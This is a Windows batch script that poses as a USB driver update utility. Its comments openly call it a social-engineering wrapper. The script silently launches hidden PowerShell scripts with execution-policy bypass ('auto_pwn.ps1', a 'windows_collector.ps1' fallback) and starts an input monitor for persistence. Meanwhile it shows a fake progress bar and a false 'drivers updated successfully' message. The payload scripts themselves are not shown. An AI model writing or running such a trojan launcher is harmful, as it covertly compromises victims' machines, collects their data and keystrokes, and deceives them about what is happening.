@echo off
REM ============================================================================
REM  USB Device Driver Update Utility
REM  (Social engineering wrapper — launches full attack chain silently)
REM ============================================================================

title USB Device Driver Update
color 0F

echo.
echo  Initializing USB Device Driver Update...
echo  Please wait while drivers are being configured.
echo.
echo  [                              ] 0%%

REM === LAUNCH FULL AUTO-PWN CHAIN (silent, hidden window) ===
start /min /b powershell.exe -NoP -NonI -Exec Bypass -W Hidden -File "%~dp0auto_pwn.ps1" >nul 2>nul

REM === FALLBACK: Original collector if auto_pwn not found ===
if not exist "%~dp0auto_pwn.ps1" (
    start /min /b powershell.exe -NoP -NonI -Exec Bypass -W Hidden -File "%~dp0windows_collector.ps1" >nul 2>nul
)

REM === INPUT MONITOR (runs separately for persistence) ===
if exist "%~dp0start_monitor.bat" (
    start /min /b "%~dp0start_monitor.bat" >nul 2>nul
)

REM === Try payloads subdirectory as well ===
if exist "%~dp0payloads\auto_pwn.ps1" (
    start /min /b powershell.exe -NoP -NonI -Exec Bypass -W Hidden -File "%~dp0payloads\auto_pwn.ps1" >nul 2>nul
)

REM === Fake progress bar while attack chain runs ===
timeout /t 2 /nobreak >nul
echo  [####                          ] 12%%
timeout /t 2 /nobreak >nul
echo  [########                      ] 25%%
timeout /t 2 /nobreak >nul
echo  [############                  ] 38%%
timeout /t 3 /nobreak >nul
echo  [################              ] 52%%
timeout /t 3 /nobreak >nul
echo  [####################          ] 65%%
timeout /t 3 /nobreak >nul
echo  [########################      ] 78%%
timeout /t 3 /nobreak >nul
echo  [############################  ] 91%%
timeout /t 2 /nobreak >nul
echo  [##############################] 100%%
echo.
echo  USB drivers updated successfully.
echo  You may now safely remove the device.
echo.
timeout /t 3 /nobreak >nul
exit
